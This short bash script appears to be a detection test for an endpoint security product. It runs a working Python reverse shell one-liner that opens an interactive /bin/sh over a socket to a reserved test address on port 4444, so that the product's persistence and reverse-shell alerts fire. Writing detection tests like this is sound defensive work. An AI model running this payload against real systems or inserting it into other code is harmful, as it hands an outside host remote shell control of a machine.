#!/bin/bash
# 04 - Reverse Shell (Python)
# Trigger: GenPersistenceLin + BashReverseShell IOA
# Tactic: Persistence / External Remote Services + C2 / Remote Access Tools
set -e
echo "=== [04] Reverse Shell (Python) ==="

# Use RFC 5737 TEST-NET address (192.0.2.1) — will fail to connect but still triggers IOA
python3 -c '
import socket, subprocess, os
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(("192.0.2.1", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
except Exception:
    pass
finally:
    try:
        s.close()
    except:
        pass
' 2>/dev/null || true

echo "[04] Done — GenPersistenceLin + BashReverseShell IOA should trigger"
